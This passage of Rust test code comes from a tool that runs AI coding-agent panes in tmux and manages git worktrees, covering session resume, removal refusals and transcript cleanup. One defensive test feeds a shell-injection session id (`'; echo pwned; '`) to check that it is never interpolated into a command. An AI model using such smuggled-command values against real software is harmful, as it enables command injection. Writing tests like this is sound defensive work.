        let again = pane_start_command(&svc, term.id).await;
        assert!(again.contains(super::test_agent::MARKER), "still the stub: {again}");
        assert!(!again.contains("re working"), "a restart says nothing: {again}");
        assert!(again.contains(&format!("{}={key}", farcooler_core::pane_env::TASK)), "{again}");
    }

    /// Only an agent that is told the task can be opened for one: a typo,
    /// another program, a shell or the changes view would export the key
    /// beside something that never reads it, and the board would say
    /// somebody is working the task. Refused before a record or a pane exists.
    #[tokio::test]
    async fn only_an_agent_that_is_told_the_task_can_be_opened_for_one() {
        let (_dir, svc, ws) = a_workspace().await;
        let (task, _) = a_task(&svc, &ws);
        for preset in ["cluade", "gemini", "bash", "shell", "changes", "fcprobe", "claude opus"] {
            let before = svc.store.list_terminals_for_workspace(ws.id).unwrap().len();
            let refused = svc.create_terminal_with_prompt(ws.id, "w", preset, None, Some(task)).await;
            assert!(
                matches!(refused, Err(DomainError::InvalidArgument { what: "command_preset" })),
                "{preset}: {refused:?}"
            );
            assert_eq!(svc.store.list_terminals_for_workspace(ws.id).unwrap().len(), before, "{preset}");
        }
        // With no task, any preset still opens as it always did.
        svc.create_terminal_with_prompt(ws.id, "s", "shell", None, None).await.expect("a shell");
    }

    /// The stub outlives the test that opened it. A stub that exits at once
    /// leaves a dead pane behind (`remain-on-exit`), and every test that acts
    /// on the pane afterwards -- `set_pane_mode` wants one that
    /// `proves_life` -- then races the stub's exit. On a fast CI runner the
    /// exit won and the test below failed with `NotFound`. Three seconds is
    /// longer than any login shell here takes to start and fail.
    #[tokio::test]
    async fn a_stubbed_agents_pane_stays_alive() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");
        assert!(pane_start_command(&svc, term.id).await.contains(super::test_agent::MARKER), "the stub");

        tokio::time::sleep(std::time::Duration::from_secs(3)).await;
        let snapshot = svc.inventory.refresh().await;
        assert!(
            snapshot.claimants(term.id).into_iter().any(|p| p.proves_life()),
            "the stub's pane died; a test acting on it afterwards would race its exit"
        );
    }

    /// The fourth launch path: a pane switched back to a terminal from a
    /// chat. It keeps the key, just as a restart does.
    #[tokio::test]
    async fn a_pane_opened_for_a_task_names_it_after_switching_modes() {
        let (_dir, svc, ws) = a_workspace().await;
        let (task, key) = a_task(&svc, &ws);
        let term = svc
            .create_terminal_with_prompt(ws.id, "w", "claude", None, Some(task))
            .await
            .expect("a pane opened for a task");

        svc.set_pane_mode(term.id, models::PaneMode::Terminal, false).await.expect("terminal");
        let command = pane_start_command(&svc, term.id).await;
        assert!(command.contains(super::test_agent::MARKER), "the stub: {command}");
        assert!(
            command.contains(&format!("{}={key}", farcooler_core::pane_env::TASK)),
            "a pane switched back to a terminal still names its task: {command}"
        );
        assert!(!command.contains("re working"), "and says nothing: {command}");
    }

    /// A task on another repository's board is refused before any pane or
    /// record exists.
    #[tokio::test]
    async fn a_task_from_another_board_opens_nothing() {
        let (_dir, svc, ws) = a_workspace().await;
        let host = Uuid::now_v7();
        let root = svc.store.create_repository_root(host, "/elsewhere", 0).unwrap();
        let other = svc.store.create_repository(host, root.id, "Elsewhere", "/elsewhere/.git", "").unwrap().id;
        svc.store.assign_task_key_prefix(other).unwrap();
        let task = svc
            .store
            .create_task(other, "not here", farcooler_store::models::Actor::User)
            .unwrap();
        let before = svc.store.list_terminals_for_workspace(ws.id).unwrap().len();

        // claude, so the board check is what refuses it; it refuses before
        // any pane exists, so no agent is started.
        let refused = svc.create_terminal_with_prompt(ws.id, "w", "claude", None, Some(task.id)).await;
        assert!(
            matches!(refused, Err(DomainError::InvalidArgument { what: "task_key" })),
            "{refused:?}"
        );
        assert_eq!(svc.store.list_terminals_for_workspace(ws.id).unwrap().len(), before);
    }
}

#[cfg(test)]
mod respawn_tests {
    use super::*;

    /// A private home and a private worktree, both real directories on disk:
    /// `transcript_exists` canonicalizes what it is given and Claude Code's
    /// project-directory name is built from the RESOLVED path, so a
    /// hand-written path string would look up a directory that never matches.
    fn scratch(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("farcooler-respawn-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    /// A transcript on disk for `session_id`, where claude keeps them.
    fn a_claude_transcript(home: &Path, worktree: &Path, session_id: &str) {
        let resolved = std::fs::canonicalize(worktree).unwrap();
        let dir = home
            .join(".claude/projects")
            .join(session_discovery::project_dir_name(&resolved));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join(format!("{session_id}.jsonl")), "{}").unwrap();
    }

    #[test]
    fn a_claude_pane_with_a_conversation_reopens_it_rather_than_naming_a_new_one() {
        // The reported bug, at the level the fix lives: restart used to build
        // its command with `preset_command`, whose claude arm declares
        // `--session-id`. That flag NAMES A NEW conversation — it does not
        // reopen one — so a restarted pane came back with no memory of what
        // was in it. Asserting the absence of `--session-id` as well as the
        // presence of `--resume` is the point: a test that only checked for
        // "claude" passed against the broken builder too.
        let home = scratch("claude-resume-home");
        let worktree = scratch("claude-resume-tree");
        let sid = Uuid::now_v7().to_string();
        a_claude_transcript(&home, &worktree, &sid);

        let cmd = respawn_command(Some(&home), "claude", worktree.to_str().unwrap(), &sid, &LaunchExtras::NONE);
        assert!(cmd.contains(&format!("claude --resume {sid}")), "must reopen it: {cmd}");
        assert!(!cmd.contains("--session-id"), "--session-id names a NEW conversation: {cmd}");
    }

    #[test]
    fn a_claude_pane_with_nothing_written_yet_starts_clean_and_still_names_no_session() {
        // A session id is declared at launch; the transcript appears only once
        // a turn happens. `--resume` on one with no file answers "No
        // conversation found with session ID", so this has to start clean —
        // but clean means CLEAN, not `--session-id <the id claude already
        // owns>`, which is what the old builder produced.
        let home = scratch("claude-clean-home");
        let worktree = scratch("claude-clean-tree");
        let sid = Uuid::now_v7().to_string();

        let cmd = respawn_command(Some(&home), "claude", worktree.to_str().unwrap(), &sid, &LaunchExtras::NONE);
        assert!(cmd.contains("claude"), "{cmd}");
        assert!(!cmd.contains("--resume"), "nothing on disk to resume: {cmd}");
        assert!(!cmd.contains("--session-id"), "{cmd}");
    }

    #[test]
    fn a_codex_pane_with_a_rollout_resumes_it_where_the_launch_builder_dropped_it() {
        // `preset_command`'s codex arm ignores the session id entirely, so a
        // restarted codex pane could never come back to its conversation no
        // matter what the record held. This is the same rollout shape
        // `session_discovery` verified on a real machine.
        let home = scratch("codex-home");
        let worktree = scratch("codex-tree");
        let sid = Uuid::now_v7().to_string();
        let dir = home.join(".codex/sessions/2026/08/03");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join(format!("rollout-2026-08-03T10-33-15-{sid}.jsonl")), "{}").unwrap();

        let cmd = respawn_command(Some(&home), "codex", worktree.to_str().unwrap(), &sid, &LaunchExtras::NONE);
        assert!(cmd.contains(&format!("codex resume {sid}")), "{cmd}");
    }

    #[test]
    fn a_session_id_that_is_not_a_uuid_is_never_interpolated_into_a_resume() {
        // `terminal_mode_command` interpolates the id unquoted inside a `-ilc`
        // string. The uuid parse is what makes that safe, so it has to gate
        // the flag rather than sit beside it — and a transcript file can be
        // named anything at all, including this.
        let home = scratch("injection-home");
        let worktree = scratch("injection-tree");
        let sid = "not-a-uuid'; echo pwned; '";
        a_claude_transcript(&home, &worktree, sid);

        let cmd = respawn_command(Some(&home), "claude", worktree.to_str().unwrap(), sid, &LaunchExtras::NONE);
        assert!(!cmd.contains("--resume"), "{cmd}");
        assert!(!cmd.contains("pwned"), "{cmd}");
    }

    #[test]
    fn no_home_directory_at_all_starts_clean_rather_than_resuming_blind() {
        let worktree = scratch("nohome-tree");
        let sid = Uuid::now_v7().to_string();
        let cmd = respawn_command(None, "claude", worktree.to_str().unwrap(), &sid, &LaunchExtras::NONE);
        assert!(!cmd.contains("--resume"), "{cmd}");
        assert!(cmd.contains("claude"), "{cmd}");
    }

    /// The upstream half of `a_clean_start_keeps_the_model_the_pane_was_launched_with`.
    ///
    /// That test hands `respawn_command` a `claude:opus` preset and checks the
    /// model survives. It passed while production never gave the builder a
    /// `claude:opus` to begin with: switching a pane into agent mode wrote
    /// `Registry::identify`'s answer — the bare agent name — straight over the
    /// column, so by the time any clean start ran, the model was already gone
    /// from the only place it was recorded. A builder test cannot see that,
    /// which is exactly why this one asserts on the value the builder is
    /// handed rather than on the builder.
    #[test]
    fn opening_a_pane_as_a_chat_does_not_cost_it_its_model() {
        // Nothing to write: the record already names this agent, and it names
        // it with more detail than `identify` can supply.
        assert_eq!(preset_after_adopting("claude:opus", "claude"), None);
        assert_eq!(preset_after_adopting("codex:gpt-5.6-sol", "codex"), None);
        assert_eq!(preset_after_adopting("claude", "claude"), None);

        // A pane that turns out to host something else IS rewritten. There is
        // no model to keep for an agent nobody recorded, and a record naming
        // the wrong agent is what this write exists to prevent: it is what
        // `terminal_mode_command` reads to decide what to respawn.
        assert_eq!(preset_after_adopting("shell", "claude"), Some("claude".into()));
        assert_eq!(preset_after_adopting("claude:opus", "codex"), Some("codex".into()));
        assert_eq!(preset_after_adopting("", "claude"), Some("claude".into()));

        // The whole point, stated as the thing a reader cares about: the
        // preset that survives a chat still builds an opus command.
        let home = scratch("adopt-home");
        let worktree = scratch("adopt-tree");
        let kept = preset_after_adopting("claude:opus", "claude")
            .unwrap_or_else(|| "claude:opus".to_string());
        let cmd = respawn_command(Some(&home), &kept, worktree.to_str().unwrap(), "", &LaunchExtras::NONE);
        assert!(cmd.contains("claude --model opus"), "{cmd}");
    }

    #[test]
    fn a_clean_start_keeps_the_model_the_pane_was_launched_with() {
        // A `claude:opus` pane that restarts with nothing to resume must come
        // back on opus. Restart used to keep the model because
        // `preset_command` was handed the whole preset; routing it through
        // this builder must not quietly cost it.
        let home = scratch("model-home");
        let worktree = scratch("model-tree");
        let cmd = respawn_command(Some(&home), "claude:opus", worktree.to_str().unwrap(), "", &LaunchExtras::NONE);
        assert!(cmd.contains("claude --model opus"), "{cmd}");
        let cmd = respawn_command(Some(&home), "codex:gpt-5.6-sol", worktree.to_str().unwrap(), "", &LaunchExtras::NONE);
        assert!(cmd.contains("codex --model gpt-5.6-sol"), "{cmd}");
    }

    #[test]
    fn an_agent_pane_never_comes_back_as_a_bare_login_shell() {
        // "claude/codexes often revert back to just shell" is the report this
        // whole change answers. `preset_command`'s last arm is `{shell} -il`,
        // and it is reached by any preset it does not recognize — so what has
        // to be true is that a preset naming an agent lands on that agent,
        // with or without anything to resume.
        let home = scratch("shell-fallback-home");
        let worktree = scratch("shell-fallback-tree");
        let shell = farcooler_core::shell::login_shell();
        for preset in ["claude", "codex", "cursor", "opencode", "claude:opus"] {
            let cmd = respawn_command(Some(&home), preset, worktree.to_str().unwrap(), "", &LaunchExtras::NONE);
            assert_ne!(cmd, format!("{shell} -il"), "{preset} came back as a shell: {cmd}");
            assert!(cmd.contains("-ilc"), "{preset} must run something: {cmd}");
        }
    }
}

#[cfg(test)]
mod chat_capability_tests {
    #[test]
    fn recognition_and_hostability_can_no_longer_disagree() {
        // This test exists because they did. Codex was recognized by
        // `activity::identify` and absent from the daemon's separate chat list, so
        // `⌃B a` on a codex pane did nothing and explained nothing. There is now
        // one table, and hostability is a field on it.
        let r = farcooler_core::activity::Registry::built_in();
        assert!(r.chat_capable("claude"));
        assert!(r.chat_capable("codex"), "codex is recognized AND hostable");
        assert!(!r.chat_capable("zsh"), "a shell is neither");
    }
}

#[cfg(test)]
mod lock_tests {
    use super::*;

    /// Two calls for the same repository get the same lock; different
    /// repositories do not block each other.
    ///
    /// The identity matters more than it looks: a lock built fresh per call
    /// would compile, pass a casual reading, and serialize nothing at all.
    #[tokio::test]
    async fn one_lock_per_repository() {
        let dir = tempfile::tempdir().unwrap();
        let svc = Service::open_in(dir.path().to_path_buf()).await.unwrap();

        let a = Uuid::now_v7();
        let b = Uuid::now_v7();

        assert!(Arc::ptr_eq(&svc.repo_lock(a), &svc.repo_lock(a)), "same repository, same lock");
        assert!(!Arc::ptr_eq(&svc.repo_lock(a), &svc.repo_lock(b)), "one repository never blocks another");

        let held = svc.repo_lock(a).lock_owned().await;
        assert!(svc.repo_lock(a).try_lock().is_err(), "a held lock excludes a second holder");
        assert!(svc.repo_lock(b).try_lock().is_ok(), "and only that repository");
        drop(held);
    }
}

#[cfg(test)]
mod remove_root_tests {
    use super::*;

    /// A registered repository with one workspace already in it, all created
    /// through the store directly. `remove_root` never touches git, so a
    /// store-level fixture is enough — the point of these tests is the
    /// refusal logic, not worktree mechanics.
    async fn fixture_with_workspace() -> (Service, models::RepositoryRoot, models::Workspace) {
        let dir = tempfile::tempdir().unwrap().keep();
        let service = Service::open_in(dir).await.unwrap();
        let root = service
            .store
            .create_repository_root(service.host_id, "/tmp/remove-root-tests", now_millis())
            .unwrap();
        let repository = service
            .store
            .create_repository(service.host_id, root.id, "repo", "/tmp/remove-root-tests/.git", "")
            .unwrap();
        let workspace = service
            .store
            .create_workspace(repository.id, "main", "/tmp/remove-root-tests", true)
            .unwrap();
        (service, root, workspace)
    }

    /// A terminal that was just created and has never been confirmed alive
    /// derives `Starting`, not `Running` — created here through the store
    /// directly with no tmux window behind it, so it stays that way as long
    /// as the inventory itself is healthy (true here: `Service::open_in`
    /// refreshes against a real, if idle, private tmux server on startup).
    /// `remove_root` must refuse rather than delete its record.
    ///
    /// Honest note on what this does and does not isolate: the up-front check
    /// in `remove_root` was widened from `Running` alone to `Running |
    /// Starting`, matching `remove_terminal`. But `remove_terminal` — which
    /// the delete loop now calls for every terminal, and which already
    /// refused `Running | Starting` before this fix — provides the same
    /// refusal as a second, independent enforcement of the identical rule
    /// during deletion. So this test proves the OUTCOME the fix exists to
    /// guarantee (a starting terminal's record is never silently deleted),
    /// but does not by itself distinguish "caught by the up-front check" from
    /// "caught by `remove_terminal` a moment later" — flipping the up-front
    /// check back to `Running` alone does not turn this red, because the
    /// second guard still catches it. Confirmed by hand rather than left
    /// implied.
    #[tokio::test]
    async fn a_starting_terminal_blocks_removal_same_as_a_running_one() {
        let (service, root, workspace) = fixture_with_workspace().await;
        assert!(
            service.inventory_snapshot().inventory_healthy,
            "this test needs a healthy inventory to mean anything"
        );

        let term = service
            .store
            .create_terminal(workspace.id, "shell", "shell", TerminalIntent::Running, 80, 24)
            .unwrap();
        let derived = service.derive_one(&term);
        assert_eq!(
            derived.state,
            TerminalState::Starting,
            "an unconfirmed terminal with no pane must derive as starting, not running, for \
             this test to prove what it claims to: {derived:?}"
        );

        match service.remove_root(root.id).await {
            Err(DomainError::RunningProcesses) => {}
            other => panic!("expected RunningProcesses for a starting terminal, got {other:?}"),
        }
    }

    /// Put some hook assembly state on a terminal, the way an arriving hook
    /// would.
    fn assemble_something(service: &Service, terminal: Uuid) {
        service.hooks.accept(
            terminal,
            farcooler_agent_hooks::Agent::Claude,
            "UserPromptSubmit",
            &serde_json::json!({ "prompt": "hello" }),
            Some("a-session"),
        );
        assert!(
            service.hooks.is_tracking(terminal),
            "this fixture is only worth anything if state was actually accumulated"
        );
    }

    /// Put a transcript on a terminal, the way a hook or a shim would.
    fn record_something(service: &Service, terminal: Uuid) {
        service.agents.record(
            terminal,
            vec![farcooler_agent::event::AgentEvent::Message {
                role: farcooler_agent::event::Role::Agent,
                text: "an answer".to_string(),
                parent: None,
            }],
            &|_, _| {},
        );
        assert_eq!(
            service.agents.replay(terminal, 0, 0).1.len(),
            1,
            "this fixture is only worth anything if a transcript was actually recorded"
        );
        assert_eq!(
            service.agents.activity(terminal),
            farcooler_protocol::v1::AgentActivity::Working,
            "and only if the row left its default, or the assertion after the delete \
             cannot tell an eviction from a terminal that never had anything"
        );
    }

    /// A terminal's transcript goes when the terminal does, too.
    ///
    /// The bigger half of the same leak, on the same delete path. `record`
    /// creates a `SessionState` and a transcript window through `or_default()`
    /// for whatever terminal it is handed, and the hook path hands it every
    /// terminal a live session routes to — panes nobody toggled into agent
    /// mode, which is most of them. That is one row plus up to
    /// `TRANSCRIPT_LIMIT` events each, held for as long as the daemon runs,
    /// beside the assembler markers the test above evicts.
    ///
    /// Nothing else clears these. `ShimMessage::Established` drops the window,
    /// but that is a shim restarting rather than a terminal ending, and on the
    /// hook path no shim ever establishes anything.
    #[tokio::test]
    async fn removing_a_terminal_drops_the_transcript_recorded_for_it() {
        let (service, _root, workspace) = fixture_with_workspace().await;
        let term = service
            .store
            .create_terminal(workspace.id, "pane", "claude", TerminalIntent::Stopped, 80, 24)
            .unwrap();
        assert_eq!(
            service.derive_one(&term).state,
            TerminalState::Exited,
            "a stopped terminal must be removable for this test to reach the delete"
        );
        record_something(&service, term.id);

        service.remove_terminal(term.id).await.expect("an exited terminal's record is removable");

        assert!(
            service.agents.replay(term.id, 0, 0).1.is_empty(),
            "the transcript outlived the terminal it belonged to"
        );
        assert_eq!(
            service.agents.activity(term.id),
            farcooler_protocol::v1::AgentActivity::Unspecified,
            "and so did the session row behind it — a window dropped without the row \
             beside it is half an eviction"
        );
    }

    /// And a removal the daemon REFUSES leaves the conversation alone.
    ///
    /// The nearest wrong wiring is the same one the assembler has: not a
    /// missing eviction but an early one, above the guard that refuses a live
    /// pane. That passes the test above and discards the transcript of a
    /// session still running, whose next event would then be numbered 0 into
    /// an empty window while every client holds a cursor into the old one.
    #[tokio::test]
    async fn a_refused_removal_leaves_a_live_terminals_transcript_alone() {
        let (service, _root, workspace) = fixture_with_workspace().await;
        assert!(
            service.inventory_snapshot().inventory_healthy,
            "this test needs a healthy inventory to derive `starting` rather than `unknown`"
        );
        let term = service
            .store
            .create_terminal(workspace.id, "pane", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();
        assert_eq!(
            service.derive_one(&term).state,
            TerminalState::Starting,
            "an unconfirmed terminal with no pane must derive as starting for the refusal below"
        );
        record_something(&service, term.id);

        match service.remove_terminal(term.id).await {
            Err(DomainError::RunningProcesses) => {}
            other => panic!("expected RunningProcesses for a starting terminal, got {other:?}"),
        }

        assert_eq!(
            service.agents.replay(term.id, 0, 0).1.len(),
            1,
            "a removal that did not happen must not discard a live conversation"
        );
    }

    /// A delete the STORE refuses leaves the conversation alone too.
    ///
    /// The other reading of "after the delete, never before", and the one the
    /// refusal test above cannot reach: `remove_terminal`'s guard returns
    /// before this function is entered at all, so nothing there says whether
    /// the two evictions sit above or below `delete_terminal`. A version
    /// conflict is what puts a failing delete and a live terminal in the same
    /// call — somebody renamed the pane between the read and the delete — and
    /// the record is still there afterwards, so its transcript has to be.
    #[tokio::test]
    async fn a_delete_that_fails_on_a_version_conflict_evicts_nothing() {
        let (service, _root, workspace) = fixture_with_workspace().await;
        let term = service
            .store
            .create_terminal(workspace.id, "pane", "claude", TerminalIntent::Stopped, 80, 24)
            .unwrap();
        record_something(&service, term.id);
        assemble_something(&service, term.id);

        match service.delete_terminal_record(term.id, term.resource_version + 7) {
            Err(DomainError::ResourceConflict) => {}
            other => panic!("expected a version conflict, got {other:?}"),
        }
        assert!(
            service.store.get_terminal(term.id).is_ok(),
            "the row must survive for this test to be about a delete that did not happen"
        );

        assert_eq!(
            service.agents.replay(term.id, 0, 0).1.len(),
            1,
            "a delete that failed discarded the transcript of a terminal that still exists"
        );
        assert!(
            service.hooks.is_tracking(term.id),
            "and its half-assembled message went with it"
        );
    }

    /// A terminal's assembler goes when the terminal does.
    ///
    /// Nothing else in the process is positioned to notice if it does not.
    /// `HookIngress` keeps one assembler per terminal and each keeps a marker
    /// per message ever displayed, so a daemon that never evicted would grow
    /// for as long as it stayed up — and every single hook would still arrive
    /// correctly the whole time, which is what makes this the kind of leak
    /// that ships.
    #[tokio::test]
    async fn removing_a_terminal_drops_the_hook_assembler_it_accumulated() {
        let (service, _root, workspace) = fixture_with_workspace().await;
        let term = service
            .store
            .create_terminal(workspace.id, "pane", "claude", TerminalIntent::Stopped, 80, 24)
            .unwrap();
        assert_eq!(
            service.derive_one(&term).state,
            TerminalState::Exited,
            "a stopped terminal must be removable for this test to reach the delete"
        );
        assemble_something(&service, term.id);

        service.remove_terminal(term.id).await.expect("an exited terminal's record is removable");

        assert!(
            !service.hooks.is_tracking(term.id),
            "the assembler outlived the terminal it belonged to"
        );
    }

    /// The other delete path, which is a separate function and would be a
    /// separate omission.
    #[tokio::test]
    async fn dismissing_a_lost_terminal_drops_its_hook_assembler_too() {
        let (service, _root, workspace) = fixture_with_workspace().await;
        assert!(
            service.inventory_snapshot().inventory_healthy,
            "this test needs a healthy inventory to derive `lost` rather than `unknown`"
        );
        let term = service
            .store
            .create_terminal(workspace.id, "pane", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();
        // Confirmed alive once and now claimed by no pane, which is what
        // `lost` means and the only state `dismiss_lost` accepts.
        let term = service
            .store
            .update_terminal(
                term.id,
                term.resource_version,
                terminal_update(&term, |u| u.runtime_confirmed = true),
            )
            .unwrap();
        assert_eq!(service.derive_one(&term).state, TerminalState::Lost);
        assemble_something(&service, term.id);

        service.dismiss_lost(term.id).await.expect("a lost terminal is dismissable");

        assert!(!service.hooks.is_tracking(term.id), "dismissal deletes the record; the \
                assembler must go with it");
    }

    /// A removal the daemon REFUSES must leave the conversation alone.
    ///
    /// The nearest wrong wiring is not a missing `forget` but an early one —
    /// dropping the assembler at the top of `remove_terminal`, before the
    /// guard that refuses a live pane. That passes the test above and loses
    /// the half-assembled message of a session that is still running, which
    /// then draws only its tail.
    #[tokio::test]
    async fn a_refused_removal_leaves_a_live_terminals_assembler_alone() {
        let (service, _root, workspace) = fixture_with_workspace().await;
        assert!(
            service.inventory_snapshot().inventory_healthy,
            "this test needs a healthy inventory to derive `starting` rather than `unknown`"
        );
        let term = service
            .store
            .create_terminal(workspace.id, "pane", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();
        assert_eq!(
            service.derive_one(&term).state,
            TerminalState::Starting,
            "an unconfirmed terminal with no pane must derive as starting for the refusal below"
        );
        assemble_something(&service, term.id);

        match service.remove_terminal(term.id).await {
            Err(DomainError::RunningProcesses) => {}
            other => panic!("expected RunningProcesses for a starting terminal, got {other:?}"),
        }

        assert!(
            service.hooks.is_tracking(term.id),
            "a removal that did not happen must not discard a message half assembled"
        );
    }
}

#[cfg(test)]
mod naming_tests {
    use super::*;

    /// One directory per repository, and the leaf is the name.
    ///
    /// The prefixed flat layout it replaced put the repository into every
    /// name, so `overnight-rate-limiting` had to be read back with the project
    /// repeated in a sidebar that already groups by project.
    #[tokio::test]
    async fn a_new_worktree_lands_under_its_repository_and_is_named_by_its_leaf() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc.create_workspace(repo, "rate limiting", "feat/rate-limiting", "HEAD").await.unwrap();

        assert_eq!(
            Path::new(&ws.worktree_path),
            dir.path().join("state").join("worktrees").join("repo").join("rate-limiting"),
            "one directory per repository, so the leaf carries the name alone"
        );
        assert_eq!(ws.name(), "rate limiting", "and reads back as what was typed");
    }

    /// Two worktrees of one name in one repository is one directory, which the
    /// filesystem settles before any uniqueness check we could write.
    ///
    /// The point of catching it here is the answer: "a worktree of that name is
    /// already here", rather than whatever git says about a directory it
    /// declined to create.
    #[tokio::test]
    async fn a_second_worktree_of_the_same_name_is_refused_by_name() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        svc.create_workspace(repo, "rate limiting", "feat/rate-limiting", "HEAD").await.unwrap();

        // Slugged the same, typed differently: the collision is between
        // directories, not between the strings someone typed.
        match svc.create_workspace(repo, "rate-limiting", "feat/rate-limiting-2", "HEAD").await {
            Err(DomainError::WorktreeExists) => {}
            other => panic!("expected WorktreeExists, got {other:?}"),
        }
    }

    /// A resumed branch names its worktree after its last segment.
    ///
    /// `feat/` says what kind of work it is, which every row in the list would
    /// otherwise repeat.
    #[tokio::test]
    async fn adopting_a_branch_names_the_worktree_after_it() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        git::git(&dir.path().join("repo"), &["branch", "feat/rate-limiting"]).await.unwrap();

        let ws = svc.adopt_branch(repo, "feat/rate-limiting").await.unwrap();

        assert_eq!(ws.name(), "rate limiting");
        assert_eq!(ws.branch, "feat/rate-limiting", "the branch keeps its prefix; the name drops it");
    }

}

#[cfg(test)]
mod remove_worktree_tests {
    use super::*;

    /// Uncommitted work is the whole reason the typed confirmation exists;
    /// a worktree with none of it needs no typed name at all.
    #[tokio::test]
    async fn a_clean_worktree_needs_no_typed_confirmation() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let side = dir.path().join("side");
        git::git(
            &dir.path().join("repo"),
            &["worktree", "add", "-q", "-b", "feat/side", side.to_str().unwrap()],
        )
        .await
        .unwrap();
        crate::reconcile::repository(&svc, repo).await.unwrap();

        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| !w.is_main_checkout)
            .unwrap();

        assert!(!svc.removal_needs_confirmation(ws.id).await.unwrap());
    }

    /// Uncommitted work is the whole reason the typed confirmation exists.
    #[tokio::test]
    async fn a_dirty_worktree_demands_the_name() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let side = dir.path().join("side");
        git::git(
            &dir.path().join("repo"),
            &["worktree", "add", "-q", "-b", "feat/side", side.to_str().unwrap()],
        )
        .await
        .unwrap();
        std::fs::write(side.join("scratch.txt"), "work in progress").unwrap();
        crate::reconcile::repository(&svc, repo).await.unwrap();

        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| !w.is_main_checkout)
            .unwrap();

        assert!(svc.removal_needs_confirmation(ws.id).await.unwrap());
    }

    /// A worktree whose directory is already gone cannot be inspected for
    /// dirt, and there is nothing left in it to lose either way — so it must
    /// need no confirmation. This is deliberate: it is how a "worktree gone"
    /// row gets dismissed without ever asking for a name to type.
    #[tokio::test]
    async fn a_worktree_whose_directory_is_already_gone_needs_no_confirmation() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let side = dir.path().join("side");
        git::git(
            &dir.path().join("repo"),
            &["worktree", "add", "-q", "-b", "feat/side", side.to_str().unwrap()],
        )
        .await
        .unwrap();
        crate::reconcile::repository(&svc, repo).await.unwrap();

        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| !w.is_main_checkout)
            .unwrap();

        std::fs::remove_dir_all(&side).unwrap();

        assert!(!svc.removal_needs_confirmation(ws.id).await.unwrap());
    }

    /// `remove_worktree` CLOSES a live terminal rather than refusing over it.
    ///
    /// This test asserted the opposite until a user review pointed out that
    /// being told to stop four terminals by hand, after pressing Remove, is
    /// being told to do the thing you just asked for. The rule changed; the
    /// safety did not — see `remove_worktree`'s own comment on why killing the
    /// process first is different from skipping the check.
    ///
    /// `remove_root` still refuses, and deliberately: removing a root revokes
    /// permission over a whole directory tree that may hold work in several
    /// worktrees, so there the refusal is the user's cue to look at what is
    /// running before they take all of it away.
    ///
    /// Built the same way `remove_root_tests::a_starting_terminal_blocks_removal_same_as_a_running_one`
    /// is: a terminal created through the store directly, with no live pane
    /// behind it, derives `Starting` rather than `Running` as long as the
    /// inventory itself is healthy. `Starting` is the harder case — a terminal
    /// mid-launch is exactly as alive as one already confirmed.
    #[tokio::test]
    async fn a_starting_terminal_is_closed_by_worktree_removal_rather_than_blocking_it() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let side = dir.path().join("side");
        git::git(
            &dir.path().join("repo"),
            &["worktree", "add", "-q", "-b", "feat/side", side.to_str().unwrap()],
        )
        .await
        .unwrap();
        crate::reconcile::repository(&svc, repo).await.unwrap();

        assert!(
            svc.inventory_snapshot().inventory_healthy,
            "this test needs a healthy inventory to mean anything"
        );

        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| !w.is_main_checkout)
            .unwrap();

        let term = svc
            .store
            .create_terminal(ws.id, "shell", "shell", TerminalIntent::Running, 80, 24)
            .unwrap();
        let derived = svc.derive_one(&term);
        assert_eq!(
            derived.state,
            TerminalState::Starting,
            "an unconfirmed terminal with no pane must derive as starting, not running, for \
             this test to prove what it claims to: {derived:?}"
        );

        svc.remove_worktree(ws.id).await.expect("a live terminal is closed, not a refusal");

        // The terminal's record goes with it. Left behind it would point at a
        // workspace row that no longer exists, and `terminals.workspace_id` has
        // no cascade to clean that up.
        assert!(
            svc.store.get_terminal(term.id).is_err(),
            "the terminal record must go with the worktree"
        );
        assert!(
            svc.store.list_workspaces_for_repository(repo).unwrap().iter().all(|w| w.id != ws.id),
            "the workspace row is gone"
        );
    }

    /// The main checkout is refused by `ws.is_main_checkout`, a fact read
    /// straight from `git worktree list`, not by comparing paths.
    #[tokio::test]
    async fn the_main_checkout_is_never_removable() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| w.is_main_checkout)
            .unwrap();

        match svc.remove_worktree(ws.id).await {
            Err(DomainError::InvalidArgument { what }) => assert_eq!(what, "the main checkout"),
            other => panic!("expected InvalidArgument(\"the main checkout\"), got {other:?}"),
        }
    }

    /// The upgraded-database case: migration 0006 added `is_main_checkout`
    /// with `DEFAULT 0`, so a database written before this feature existed
    /// has the main checkout's row saying "not main" — and
    /// `set_workspace_identity` is used here to put a row into exactly that
    /// state deliberately, standing in for that database, rather than relying
    /// on `ws.is_main_checkout` ever having been right.
    /// The path comparison in `remove_worktree` must refuse it anyway.
    ///
    /// Deleting that path check (and keeping only the `ws.is_main_checkout`
    /// guard above it) turns this red, since the row's flag is false here on
    /// purpose. Verified by hand.
    #[tokio::test]
    async fn a_wrong_flag_does_not_defeat_the_path_backstop() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| w.is_main_checkout)
            .unwrap();

